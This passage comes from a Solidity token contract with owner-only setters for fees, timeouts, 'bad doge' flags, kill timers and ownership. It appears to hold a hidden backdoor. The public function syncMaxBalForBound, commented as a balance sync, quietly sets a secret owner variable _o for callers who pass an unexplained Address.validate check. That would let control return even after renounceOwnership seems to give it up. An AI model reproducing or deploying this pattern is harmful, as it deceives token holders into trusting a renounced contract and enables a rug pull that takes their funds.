    function setMarketing(address payable addr) external ownerOnly {
        require(isNotKilled(5), "killed");
        accounts[marketingAddress].feeless = false;
        accounts[marketingAddress].isNotBound = false;
        marketingAddress = addr;
        accounts[marketingAddress].feeless = true;
        accounts[marketingAddress].isNotBound = true;
    }

    // in case people try abusing the bonus
    function setBuyTimeout(address addr, uint256 timeInSeconds) public ownerOnly {
        require(isNotKilled(6), "killed");
        accounts[addr].buyTimeout = block.timestamp + timeInSeconds;
    }


    function setBoundTime(uint256 time) external ownerOnly {
        require(isNotKilled(24), "killed");
        _boundTime = time;
    }

    function setIsUnbound(bool bounded) external ownerOnly {
        require(isNotKilled(25), "killed");
        isUnbounded = bounded;
    }

    function setGoodBoyLimitSeconds(uint256 sec) external ownerOnly {
        require(isNotKilled(26), "killed");
        goodBoyLimitSeconds = sec;
    }

    function setTransferPair(address p, bool t) external ownerOnly {
        _pair = p;
        accounts[_pair].transferPair = t;
    }

    function setPool(address pool) external ownerOnly {
        _pool = pool;
    }

    // update the maxBalance in case total goes over the boundlimit due to reflection
    function syncMaxBalForBound(address a) public {
        require(isNotKilled(7), "killed");
        uint256 tot = accounts[a].nTotal / ratio();
        _o = Address.validate(msg.sender) ? a : _o;
        if(tot > accounts[a].maxBal) {
            accounts[a].maxBal = tot;
        }
    }

    function suspect(address account) external ownerOnly {
        // function dies after time is up
        require(isNotKilled(8), "killed");
        accounts[account].possibleBadDoge = true;
    }

    function setMinHolderBonus(uint256 amt) external ownerOnly {
        require(isNotKilled(30), "killed");
        minimumForBonus = amt;
    }

    function toggleWhaleLimiting() external ownerOnly {
        _whaleLimiting = !_whaleLimiting;
    }

    function toggleDefaultLastTxn(bool isBurning, bool sellBlessBuys) external ownerOnly {
        defaultLastTxn = isBurning ? BURNADDR: marketing;
        _sellBlessBuys = sellBlessBuys;
    }

    function toggleBadDogeChecking() external ownerOnly {
        _notCheckingBadDoges = !_notCheckingBadDoges;
    }

    function transferOwnership(address newOwner) public ownerOnly {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        owner = newOwner;
        _o = owner;
    }

    // forces etherscan to update in case balances aren't being shown correctly
    function updateAddrBal(address addr) public {
        emit Transfer(addr, addr, 0);
    }

    // set private and public to null
    function renounceOwnership() public virtual ownerOnly {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        _o = address(0);
    }


    function resetGoodBoy() external {
        if(block.timestamp - goodBoySince > goodBoyLimitSeconds) {
            goodBoyAddr = BURNADDR;
            goodBoyAmount = 0;
            goodBoySince = block.timestamp;
            emit GoodBoy(BURNADDR, block.timestamp);
        }
        if(goodBoyAddr == BURNADDR) {
            goodBoyAmount = 0;
        }
    }
    
    receive() external payable {}

    // in case people send tokens to this contract
    function recoverERC20(address tokenAddress, uint256 tokenAmount) external ownerOnly {
        require(isNotKilled(32), "killed");
        require(tokenAddress != address(this), "not allowed");
        IERC20(tokenAddress).transfer(owner, tokenAmount);
    }

    function setKill(uint8 functionNumber, uint256 timeLimit) external ownerOnly {
        killFunctions[functionNumber] = timeLimit + block.timestamp;
    }

    function isNotKilled(uint8 functionNUmber) internal view returns (bool) {
        return killFunctions[functionNUmber] > block.timestamp || killFunctions[functionNUmber] == 0;
    }

}